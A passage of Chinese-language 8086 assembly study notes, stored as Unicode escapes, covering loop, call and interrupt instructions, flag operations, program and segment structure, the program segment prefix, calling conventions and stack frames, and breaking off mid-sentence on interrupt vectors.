\u662f\u7acb\u5373\u6570\uff0cloop \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopz \u6307\u4ee4\u683c\u5f0f \uff1aloopz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 1 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loope \u6307\u4ee4\u683c\u5f0f \uff1aloope dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopz loopnz \u6307\u4ee4\u683c\u5f0f \uff1aloopnz dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u5148 cx \u51cf 1\uff08\u6b64\u5904\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff09\uff0c\u7136\u540e\u5982\u679c cx != 0 \u4e14 zf == 0 \u5219\u8df3\u8f6c\u5230 dest \u6ce8\u610f \uff1adest \u662f\u7acb\u5373\u6570\uff0cloopnz \u5c5e\u4e8e\u77ed\u8df3\uff0c\u9700\u8981\u76ee\u6807\u5730\u5740\u4e0e\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u8ddd\u79bb\u5728 [-128, 127] \u5185 loopne \u6307\u4ee4\u683c\u5f0f \uff1aloopne dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u5faa\u73af \u6ce8\u610f \uff1a\u5b8c\u5168\u7b49\u4ef7\u4e8e loopnz \u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de\u6307\u4ee4 \u00b6 call \u7c7b\u4f3c jmp \u7684\u8fd1\u8df3\u8fdc\u8df3\u4e5f\u6709\u8fd1\u8fc7\u7a0b\u8c03\u7528\u548c\u8fdc\u8fc7\u7a0b\u8c03\u7528\uff0c\u5176\u533a\u522b\u4e5f\u5728\u4e8e cs \u662f\u5426\u53d1\u751f\u53d8\u5316 call \u8fd1\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u4e0b\u6761\u6307\u4ee4\u504f\u79fb\u5730\u5740\u5165\u6808\u7136\u540e\u8df3\u8f6c\u5230 dest\uff0c\u5373 push ip, ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5bc4\u5b58\u5668\u6216\u5185\u5b58 retn \u6307\u4ee4\u683c\u5f0f \uff1aretn / ret / retn count / ret count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fd1\u8fd4\u56de retn / ret\uff1a\u4ece\u6808\u4e2d\u5f39\u51fa\u4e00\u4e2a\u5341\u516d\u4f4d\u6570\u5230 ip\uff0c\u5373 pop ip retn count / ret count\uff1a\u5148 pop ip \u7136\u540e sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fd1\u8c03\u7528\u8fd4\u56de call \u8fdc\u8c03\u7528 \u6307\u4ee4\u683c\u5f0f \uff1acall dest \u6307\u4ee4\u4f5c\u7528 \uff1apush cs, push ip, cs:ip = dest \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u7acb\u5373\u6570\u6216\u5185\u5b58\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u8981\u5199\u6210 \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u7684\u5f62\u5f0f\uff0c\u5982\u679c\u662f\u5185\u5b58\u5219\u5b58\u50a8\u7684\u7b2c\u4e00\u4e2a\u5b57\u8868\u793a\u504f\u79fb\u5730\u5740\u3001\u7b2c\u4e8c\u4e2a\u5b57\u8868\u793a\u6bb5\u5730\u5740 retf \u6307\u4ee4\u683c\u5f0f \uff1aretf / retf count \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdc\u8fd4\u56de\uff0cpop ip, pop cs\uff0c\u82e5\u6709 count \u5219 sp += count \u6ce8\u610f \uff1a\u5982\u679c\u6709 count \u5219 count \u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u7528\u4e8e\u4ece call \u8fdc\u8c03\u7528\u8fd4\u56de \u4e2d\u65ad\u548c\u4e2d\u65ad\u8fd4\u56de\u6307\u4ee4 \u00b6 \u4e2d\u65ad\u6307\u4ee4\u4e00\u822c\u7528\u4e8e\u5411\u7cfb\u7edf\u63d0\u51fa\u4e2d\u65ad\u8bf7\u6c42\u5f97\u5230\u7cfb\u7edf\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u770b\u4f5c\u8c03\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u51fd\u6570 int \u6307\u4ee4\u683c\u5f0f \uff1aint n \u6307\u4ee4\u4f5c\u7528 \uff1a\u8c03\u7528 n \u53f7\u4e2d\u65ad\uff0c\u7b49\u6548\u7684\u64cd\u4f5c\u6709 pushf, push cs, push ip tf = 0, if = 0, ip = word ptr 0:[n*4], cs = word ptr 0:[n*4+2] \u6ce8\u610f \uff1an \u4e3a\u7acb\u5373\u6570\uff0c\u79f0\u4e3a\u4e2d\u65ad\u53f7\uff0c\u5728\u8303\u56f4 [0, 0FFh] \u5185\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF into \u6307\u4ee4\u683c\u5f0f \uff1ainto \u6307\u4ee4\u4f5c\u7528 \uff1a\u6ea2\u51fa\u4e2d\u65ad\uff0c\u5982\u679c of == 1 \u5219\u8c03\u7528 4 \u53f7\u4e2d\u65ad\uff08int 4h\uff09\uff0cif tf \u662f\u5426\u6e05\u7a7a\u7531\u4e0d\u540c\u5904\u7406\u5668\u51b3\u5b9a OF DF IF TF SF ZF AF PF CF iret \u6307\u4ee4\u683c\u5f0f \uff1airet \u6307\u4ee4\u4f5c\u7528 \uff1a\u4e2d\u65ad\u8fd4\u56de\uff0c\u7b49\u6548\u64cd\u4f5c\u6709 pop ip, pop cs, popf \u6ce8\u610f \uff1a\u4e00\u822c\u7528\u4e8e\u4ece int \u6216 into \u4ea7\u751f\u7684\u4e2d\u65ad\u4e2d\u8fd4\u56de\uff0c\u6807\u5fd7\u4f4d\u56de\u5230\u4e2d\u65ad\u524d\u7684\u72b6\u6001 \u6742\u7c7b\u6307\u4ee4 \u00b6 clc \u6307\u4ee4\u683c\u5f0f \uff1aclc \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 0 OF DF IF TF SF ZF AF PF CF stc \u6307\u4ee4\u683c\u5f0f \uff1astc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u8fdb\u4f4d\u4f4d\uff0c\u5373 cf = 1 OF DF IF TF SF ZF AF PF CF cmc \u6307\u4ee4\u683c\u5f0f \uff1acmc \u6307\u4ee4\u4f5c\u7528 \uff1a\u8fdb\u4f4d\u4f4d\u6c42\u53cd\uff0c\u5373 cf = ~cf OF DF IF TF SF ZF AF PF CF cld \u6307\u4ee4\u683c\u5f0f \uff1acld \u6307\u4ee4\u4f5c\u7528 \uff1a\u6e05\u7a7a\u65b9\u5411\u4f4d\uff0c\u5373 df = 0\uff08\u6b63\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF std \u6307\u4ee4\u683c\u5f0f \uff1astd \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bbe\u7f6e\u65b9\u5411\u4f4d\uff0c\u5373 df = 1\uff08\u8d1f\u65b9\u5411\uff09 OF DF IF TF SF ZF AF PF CF cli \u6307\u4ee4\u683c\u5f0f \uff1acli \u6307\u4ee4\u4f5c\u7528 \uff1a\u7981\u6b62\u4e2d\u65ad\uff0c\u5373 if = 0 OF DF IF TF SF ZF AF PF CF sti \u6307\u4ee4\u683c\u5f0f \uff1asti \u6307\u4ee4\u4f5c\u7528 \uff1a\u5141\u8bb8\u4e2d\u65ad\uff0c\u5373 if = 1 OF DF IF TF SF ZF AF PF CF nop \u6307\u4ee4\u683c\u5f0f \uff1anop \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u64cd\u4f5c\uff0c\u673a\u5668\u7801 90h\uff0c\u5360\u7528\u4e00\u4e2a\u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u6d88\u8017\u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4e0d\u8fdb\u884c\u64cd\u4f5c hlt \u6307\u4ee4\u683c\u5f0f \uff1ahlt \u6307\u4ee4\u4f5c\u7528 \uff1a\u505c\u6b62\u5904\u7406\u5668\u5de5\u4f5c\uff0c\u76f4\u5230\u7cfb\u7edf\u590d\u4f4d\u6216\u53d1\u9001\u975e\u5c4f\u853d\u4e2d\u65ad\u6216\u5916\u90e8\u4e2d\u65ad 8086 \u6c47\u7f16\u7a0b\u5e8f\u7f16\u5199 \u00b6 \u6c47\u7f16\u7a0b\u5e8f\u57fa\u672c\u7ed3\u6784 \u00b6 data segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 hey db ' Hello , world ! ' , 0 Dh , 0 Ah , ' $ ' ; \u4f2a\u6307\u4ee4\u8bed\u53e5 data ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 code segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 assume cs : code , ds : data ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 main: ; \u6307\u4ee4\u8bed\u53e5 mov ax , data ; ... mov ds , ax mov ah , 9 mov dx , offset hey int 21 h mov ah , 4 Ch int 21 h code ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 end main ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 \u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528 \u00b6 \u6bb5\u5b9a\u4e49 \u00b6 < segmentname > segment [ < align > ] [ < combine > ] [ '< class >' ] < statements > < segmentname > ends \u65b9\u62ec\u53f7\u4e2d\u53ef\u4ee5\u7701\u7565 align\uff1a\u5bf9\u9f50\u65b9\u5f0f\uff0cbyte word dword para page\uff08para \u4e3a 16 \u5b57\u8282\uff0cpage \u4e3a 256 \u5b57\u8282\uff09\u7f3a\u7701\u4e3a para combine\uff1a\u5408\u5e76\u7c7b\u578b\uff0cpublic stack common memory at\uff0cpublic \u4e00\u822c\u7528\u4e8e\u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\uff0cstack \u7528\u4e8e\u5806\u6808\u6bb5 ss \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740\uff0csp \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u672b\u5c3e\u5b57\u8282\u504f\u79fb\u5730\u5740\u52a0 1 \u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\u53ef\u4ee5\u7701\u7565 public\uff0c\u5806\u6808\u6bb5\u4e0d\u80fd\u7701\u7565 stack 'class'\uff1a\u7c7b\u522b\u540d \u6570\u636e\u6bb5\u5b9a\u4e49\u65f6\u521d\u59cb\u6570\u636e\u4f2a\u6307\u4ee4\u4e3a \u53d8\u91cf\u540d\uff08\u6807\u53f7\u540d\uff09\u3001\u5927\u5c0f\u3001\u5185\u5bb9 \uff0c\u5927\u5c0f\u5373\u4e3a db dw dd \u7b49\u3002\u5982\u679c\u91cd\u590d\u53ef\u4ee5\u7528 \u5927\u5c0f \u5185\u5bb9 dup(\u6b21\u6570) \u7684\u5f62\u5f0f \u5806\u6808\u6bb5\u5b9a\u4e49\u4e00\u822c\u4f7f\u7528\uff1a stk segment stack db 100 h dup ( 0 ) stk ends \u5373\u5f00\u542f\u4e00\u4e2a 100h \u5927\u5c0f\u7684\u5806\u6808 \u6bb5\u7684\u5047\u8bbe \u00b6 assume \u7528\u6765\u5efa\u7acb\u6bb5\u5bc4\u5b58\u5668\u4e0e\u6bb5\u7684\u5173\u7cfb\uff0c\u5e2e\u52a9\u6c47\u7f16\u7f16\u8bd1\u7a0b\u5e8f\u8865\u5145\u6bb5\u5730\u5740 \u4e00\u822c\u5199\u4e3a assume cs : code ds : data ss : stk \u7684\u5f62\u5f0f\uff0c\u8fd9\u6837\u89e3\u6790\u53d8\u91cf\u65f6\u5c31\u53ef\u4ee5\u81ea\u52a8\u586b\u5145\u6bb5\u5730\u5740\uff0c\u6bd4\u5982\u4f7f\u7528 mov ah , [ abc ] \u6765\u5f15\u7528 data \u6bb5\u4e2d\u53d8\u91cf abc\uff0cabc \u7684\u6bb5\u5730\u5740\u4e3a data\uff0c\u800c\u901a\u8fc7 assume \u77e5\u9053 data \u5c31\u662f ds\uff0c\u56e0\u6b64\u4f1a\u88ab\u89e3\u91ca\u4e3a mov ah , ds :[...] \u867d\u7136 cs \u548c ss \u4f1a\u81ea\u52a8\u8d4b\u503c\u4e3a\u6bb5\u5730\u5740\uff0c\u4f46 ds \u548c es \u4e0d\u4f1a\uff0c\u9700\u8981\u5728\u4ee3\u7801\u6bb5\u91cc\u624b\u52a8\u4fee\u6539 \u6bb5\u7684\u5f15\u7528 \u00b6 \u76f4\u63a5\u5199\u6bb5\u540d\u5c31\u662f\u6bb5\u5730\u5740\u3002\u4f7f\u7528 seg \u53d8\u91cf\u540d \u6216 seg \u6807\u53f7\u540d \u5373\u8868\u793a\u53d8\u91cf/\u6807\u53f7\u6240\u5728\u7684\u6bb5\u5730\u5740 \u7a0b\u5e8f\u7684\u7ed3\u675f \u00b6 \u6e90\u7a0b\u5e8f\u7684\u7ed3\u675f \u00b6 \u4f7f\u7528 end \u6307\u4ee4\u7ed3\u675f\uff0c\u683c\u5f0f\u4e3a end \u6807\u53f7\u540d \uff0c\u6307\u5b9a\u7a0b\u5e8f\u4ece\u6807\u53f7\u5904\u5f00\u59cb\u8fd0\u884c \u7a0b\u5e8f\u6bb5\u524d\u7f00 \u00b6 \u7a0b\u5e8f\u6bb5\u524d\u7f00\uff08Program Segment Prefix\uff0cPSP\uff09\u662f\u4e00\u6bb5\u957f\u5ea6\u4e3a 100h \u5b57\u8282\u7684\u5185\u5b58\u3002DOS \u5728\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u5148\u4e3a\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a PSP\uff0c\u7136\u540e DOS \u8bfb\u53d6\u6539\u7a0b\u5e8f\u5185\u5bb9\u88c5\u5165 PSP \u540e\u9762\u7684\u5185\u5b58\u4e2d\uff0c\u6700\u540e\u628a ds \u548c es \u8bbe\u7f6e\u4e3a PSP \u6bb5\u5730\u5740\uff0c\u628a ss \u548c sp \u8bbe\u7f6e\u4e3a\u5806\u6808\u6bb5\u6bb5\u5730\u5740\u548c\u5806\u6808\u6bb5\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5730\u5740\u52a0 1\uff0c\u518d\u628a cs \u8bbe\u7f6e\u4e3a\u4ee3\u7801\u6bb5\u6bb5\u5730\u5740\uff0cip \u8bbe\u7f6e\u4e3a\u6e90\u7a0b\u5e8f\u4e2d end \u6307\u5b9a\u6807\u53f7\u7684\u504f\u79fb\u5730\u5740\uff0c\u7136\u540e\u7a0b\u5e8f\u4ece cs:ip \u5f00\u59cb\u8fd0\u884c PSP \u91cc\u9762\u5b58\u653e\u4e86\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u6709\u5173\u7684\u91cd\u8981\u4fe1\u606f\uff0c\u6bd4\u5982\u547d\u4ee4\u884c\u53c2\u6570\u3001\u73af\u5883\u5757\u6bb5\u5730\u5740\u3001\u7236\u7a0b\u5e8f\u7684 PSP \u6bb5\u5730\u5740\u7b49 \u7a0b\u5e8f\u7684\u7ec8\u6b62 \u00b6 \u901a\u5e38\u8c03\u7528 21h \u53f7\u4e2d\u65ad\u7684 4C \u53f7\u529f\u80fd\u7ec8\u6b62\uff0c\u5982\uff1a mov ah , 4 Ch mov al , \u8fd4\u56de\u7801 int 21 h \u6c47\u7f16\u7a0b\u5e8f\u8bed\u53e5 \u00b6 \u7a7a\u767d\u4e0d\u654f\u611f \u5e38\u6570\u53ef\u4ee5\u4f7f\u7528\u6574\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff08\u62c6\u4e3a\u5b57\u7b26\uff09 \u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5e38\u6570\uff0c\u6709 + - * / mod shl shr not and or xor seg offset\uff0c\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u80fd\u51fa\u73b0\u5bc4\u5b58\u5668\u7b49\uff0c\u53ea\u80fd\u662f\u5e38\u6570 \u53ef\u4ee5\u4f7f\u7528 eql \u548c = \u5b9a\u4e49\u7b26\u53f7\u5e38\u6570 = \u7684\u53f3\u4fa7\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 eql \u7684\u53f3\u4fa7\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u3001\u6c47\u7f16\u8bed\u53e5\uff08 dosint eql < int 21 h > \uff09\uff0c\u4f46\u4e0d\u80fd\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 \u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u7684\u547d\u540d\uff1a\u53ef\u4ee5\u662f 52 \u4e2a\u5927\u5c0f\u5199\u5b57\u6bcd\u300110 \u4e2a\u6570\u5b57\u3001\u4ee5\u53ca @$?_\uff0c\u6570\u5b57\u4e0d\u80fd\u5f00\u5934\uff0c$ \u4e0e ? \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u7f16\u8bd1\u65f6\u52a0\u4e0a /ml \u533a\u5206\u5927\u5c0f\u5199\uff09 \u6807\u53f7\u5b9a\u4e49 \u6807\u53f7\u540d: \u5373\u53ef \u6216\u8005 \u6807\u53f7\u540d label near | far | byte | word | dword near far \u6807\u8bc6\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7 byte word dword \u6807\u8bc6\u6807\u53f7\u4e3a\u53d8\u91cf \u53d8\u91cf\u7684\u5f15\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf\u540d\u6216\u8005 [\u53d8\u91cf\u540d] \u53ef\u4ee5\u4f7f\u7528 \u53d8\u91cf\u540d[\u504f\u79fb] \u6765\u7c7b\u4f3c\u6570\u7ec4\u5f15\u7528\u503c\uff0c\u4f46\u504f\u79fb\u8bb0\u5f97\u504f\u79fb 1 \u5c31\u662f\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u4e0d\u662f\u4e0b\u4e00\u4e2a\u5143\u7d20 \u5b50\u7a0b\u5e8f\u8bbe\u8ba1 \u00b6 \u5b50\u7a0b\u5e8f\u53c8\u79f0\u8fc7\u7a0b\uff0c\u5373\u7c7b\u4f3c\u9ad8\u7ea7\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u8fc7 call \u8c03\u7528 ret \u8fd4\u56de\uff0c\u53ef\u4ee5\u8fd1\u8c03\u7528\u6216\u8fdc\u8c03\u7528\u3002\u8fc7\u7a0b\u7684\u5b9a\u4e49\uff1a < name > proc < attribute > ... < name > endp \u5176\u4e2d attribute \u4e3a near \u6216 far\uff0cnear \u5b9a\u4e49\u8fd1\u8fc7\u7a0b\u4f9b\u8fd1\u8c03\u7528\uff0c\u53ea\u80fd\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u5185\u8d77\u4f5c\u7528\uff1bfar \u5b9a\u4e49\u8fdc\u8fc7\u7a0b\u4f9b\u8fdc\u8c03\u7528\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u6216\u4e0d\u540c\u4ee3\u7801\u6bb5\u5185\u4f7f\u7528 \u5982\u679c\u8fbe\u5230\u51fd\u6570\u7684\u6548\u679c\u4e5f\u53ef\u4ee5\u4e0d\u5b9a\u4e49\u8fc7\u7a0b\uff0c\u53ea\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\uff0c\u7136\u540e\u4f7f\u7528 ret / retn \u8fd4\u56de \u8fc7\u7a0b\u4e2d\u8981\u4fdd\u62a4\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\u8981\u5728\u8fc7\u7a0b\u5f00\u5934 push \u5165\u5806\u6808\uff0c\u7ed3\u5c3e\u4ece\u5806\u6808 pop \u56de\u6765 \u5806\u6808\u4f20\u9012\u53c2\u6570 \u00b6 \u4f7f\u7528\u5806\u6808\u4f20\u9012\u53c2\u6570\u6709\u4e09\u79cd\u6807\u51c6\u65b9\u5f0f __cdecl \u65b9\u5f0f \u00b6 c \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u5e76\u4e14\u7531\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 f: push bp mov bp , sp ... mov sp , bp pop bp ret main: ... push a2 ; \u538b\u5165\u53c2\u6570 push a1 call f add sp , 4 ; \u6e05\u7406\u5806\u6808 __pascal \u65b9\u5f0f \u00b6 pascal \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u5de6\u5230\u53f3\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 f: push bp mov bp , sp ... mov sp , bp pop bp ret 4 main: ... push a1 push a2 call f __stdcall \u65b9\u6cd5 \u00b6 Windows API \u7684\u6807\u51c6\u65b9\u6cd5\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808 \u52a8\u6001\u53d8\u91cf\u4e0e\u5806\u6808\u7ed3\u6784 \u00b6 \u6bd4\u5982 c \u8bed\u8a00\u7684\u89c4\u8303\uff0c\u5728\u51fd\u6570\u4e2d\u4f1a\u6709\u52a8\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53d8\u91cf\u4f1a\u5b58\u653e\u5728\u5806\u6808\u4e0a\u3002\u51fd\u6570\u5f00\u5934\u5148 push bp \u5b58\u4e0b\u524d\u5e27\u6307\u9488\uff0c\u7136\u540e mov bp, sp \u5c06 bp \u79fb\u52a8\u5230\u6808\u9876\u3002\u4e4b\u540e\u53ef\u4ee5 sub sp, ... \u6765\u5411\u4e0a\u79fb\u52a8 sp \u6307\u9488\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e3a\u51fd\u6570\u7559\u51fa\u5806\u6808\u4e0a\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\uff0c\u8fd9\u4e9b\u7a7a\u95f4\u88ab\u7528\u6765\u5b58\u653e\u5c40\u90e8\u53d8\u91cf\u3002\u6267\u884c\u8fc7 sub sp, ... \u540e\u7684\u5806\u6808\u7ed3\u6784\u5982\uff1a +-------------+ | | <- sp +-------------+ \\ | | | +-------------+ | | | | +-------------+ |- \u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4 | | | +-------------+ | | | | +-------------+ / | bp | <- bp +-------------+ | return addr | <- \u7531 call \u538b\u5165 +-------------+ | arg0 | <- [bp+4] +-------------+ | arg1 | <- [bp+6] +-------------+ | ... | +-------------+ \u5982\u56fe\u5373\u4e3a\u901a\u8fc7 sub sp, 10 \u5f00\u8f9f\u4e86 10 \u4e2a\u5b57\u8282\u7684\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u6b64\u65f6\u518d\u8fdb\u884c push \u548c pop \u64cd\u4f5c\u65f6\u5219\u4f1a\u5411\u4e0a\u589e\u957f\u4e0d\u4f1a\u8986\u76d6\u8be5\u51fd\u6570\u7684\u7a7a\u95f4\u3002 \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u4e5f\u90fd\u901a\u8fc7 bp \u6765\u8bbf\u95ee\uff0c\u6bd4\u5982\u53c2\u6570\u4ece [bp+4] \u5f00\u59cb\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540e [bp+6] \u662f\u7b2c\u4e8c\u4e2a\uff0c\u2026\u2026\u3002\u5c40\u90e8\u53d8\u91cf\u90fd\u662f\u901a\u8fc7 [bp-...] \u6765\u8fdb\u884c\u8bbf\u95ee\u7684 \u8fd9\u6837\u7684\u5e27\u6808\u7ed3\u6784\u5728\u51fd\u6570\u9000\u51fa\u65f6\u5148 mov sp, bp\uff0c\u6b64\u65f6 sp \u56de\u843d\u56de bp \u7684\u4f4d\u7f6e\uff0c\u5c40\u90e8\u53d8\u91cf\u5168\u90e8\u5931\u6548\uff0c\u7136\u540e pop bp \u53d6\u51fa\u524d\u5e27\u6307\u9488\uff0c\u518d ret\uff0c\u6b64\u65f6 pop \u51fa\u8fd4\u56de\u5730\u5740\u8fd4\u56de\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u5904\u60c5\u51b5\u5806\u6808\u4e2d\u7684\u53c2\u6570 C \u8bed\u8a00\u7684\u51fd\u6570\u91cc bp \u4e0d\u8981\u88ab\u66f4\u6539\uff0c\u540c\u6837\u4e5f\u9700\u8981\u4fdd\u62a4 bx si di \u7684\u503c\uff0c\u4f7f\u5176\u5728\u8c03\u7528\u51fd\u6570\u524d\u540e\u4e0d\u53d8\uff0c\u4e14\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7531 ax \u63d0\u4f9b\uff0c\u6240\u4ee5\u4e00\u822c\u7684\u51fd\u6570\u5199\u6cd5\u5c31\u662f\uff1a f: push bp mov bp , sp sub sp , ... push bx push si push di ... ; [bp+?] \u4e3a\u53c2\u6570 ... ; [bp-?] \u4e3a\u5c40\u90e8\u53d8\u91cf mov ax , ... ; \u8bbe\u7f6e\u8fd4\u56de\u503c pop di pop si pop bx mov sp , bp pop bp ret \u8fd9\u79cd\u5199\u6cd5\u4e0b\u5e27\u6808\u7ed3\u6784\u548c\u5bc4\u5b58\u5668\u90fd\u4e0d\u4f1a\u4e71\u6389\uff0c\u5373\u4f7f\u662f\u8fdb\u884c\u9012\u5f52\u4e5f\u6ca1\u6709\u95ee\u9898 \u4e2d\u65ad \u00b6 \u4e2d\u65ad\u662f\u5728 CPU \u8fd0\u884c\u671f\u95f4\u9047\u5230\u67d0\u4e9b\u60c5\u51b5\u6682\u65f6\u4e2d\u6b62\u5f53\u524d\u7a0b\u5e8f\uff0c\u53bb\u6267\u884c\u53e6\u4e00\u6bb5\u7279\u6b8a\u5904\u7406\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u5206\u4e3a\u5185\u90e8\u4e2d\u65ad\u548c\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u7531 int \u6307\u4ee4\u6216\u8005 CPU \u7684\u67d0\u4e9b\u9519\u8bef\u6216\u8005\u8c03\u8bd5\u670d\u52a1\u5f15\u8d77\u7684\uff0c\u5916\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u65f6\u949f\u4e2d\u65ad\u3001\u952e\u76d8\u4e2d\u65ad\u7b49 \u4e2d\u65ad\u8c03\u7528\u4e0e\u8fd4\u56de\u5728\u524d\u9762\u6307\u4ee4\u90e8\u5206\u6709\u4ecb\u7ecd \u4e2d\u65ad\u5411\u91cf \u00b6 \u4e2d\u65ad\u5411\u91cf\u5373\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u5165\u53e3\u7684\u5730\u5740\uff0c\u4e3a 4 \u4e2a\u5b57\u8282\uff0c\u524d\u4e24\u4e2a\u5b57\u8282\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u4e3a\u6bb5\u5730\u5740 \u7cfb\u7edf\u4e2d\u4e00\u5171\u6709 256 \u4e2a\u4e2d\u65ad\u53f7\uff0c\u8303\u56f4\u5728 00h \u5230 0FFh\uff0c\u6bb5\u5730\u5740 0000h \u5904\u4e3a\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u4e2d\u65ad\u5411\u91cf\u7684\u5730\u5740\u4f4d\u4e8e 